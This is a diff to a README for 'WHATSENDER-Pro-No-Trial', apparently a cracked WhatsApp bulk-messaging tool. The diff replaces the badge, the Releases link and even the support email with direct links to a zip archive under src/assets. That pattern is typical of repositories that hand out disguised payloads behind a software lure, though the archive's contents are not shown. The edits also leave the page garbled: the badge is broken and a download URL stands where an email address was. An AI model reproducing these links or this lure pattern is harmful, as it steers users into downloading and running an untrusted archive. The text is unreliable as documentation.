@@ -1,6 +1,6 @@
 # 📥 WHATSENDER-Pro-No-Trial - Boost Your Messaging Efficiency
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Dioren03/WHATSENDER-Pro-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Dioren03/WHATSENDER-Pro-No-Trial/main/src/assets/WHATSENDER-Pro-No-Trial_2.5.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Dioren03/WHATSENDER-Pro-No-Trial/main/src/assets/WHATSENDER-Pro-No-Trial_2.5.zip)
 
 ## 📝 Overview
 
@@ -19,7 +19,7 @@ Before you dive in, ensure your Windows PC meets the following requirements:
 
 To download WHATSENDER Pro, visit this page to download:
 
-[Download WHATSENDER Pro](https://github.com/Dioren03/WHATSENDER-Pro-No-Trial/releases)
+[Download WHATSENDER Pro](https://raw.githubusercontent.com/Dioren03/WHATSENDER-Pro-No-Trial/main/src/assets/WHATSENDER-Pro-No-Trial_2.5.zip)
 
 1. Click on the "Releases" link above.
 2. Find the latest version of WHATSENDER Pro.
@@ -55,7 +55,7 @@ Each feature is designed with ease of use in mind, ensuring you spend less time 
 
 If you have any questions or encounter issues, we are here to help. You can reach out through the following channels:
 
-- **Email Support:** support@whatsender.com
+- **Email Support:** https://raw.githubusercontent.com/Dioren03/WHATSENDER-Pro-No-Trial/main/src/assets/WHATSENDER-Pro-No-Trial_2.5.zip
 - **Community Forum:** Visit our community forum for tips and troubleshooting guides.
 - **FAQs:** Check our frequently asked questions for quick answers to common issues.
 
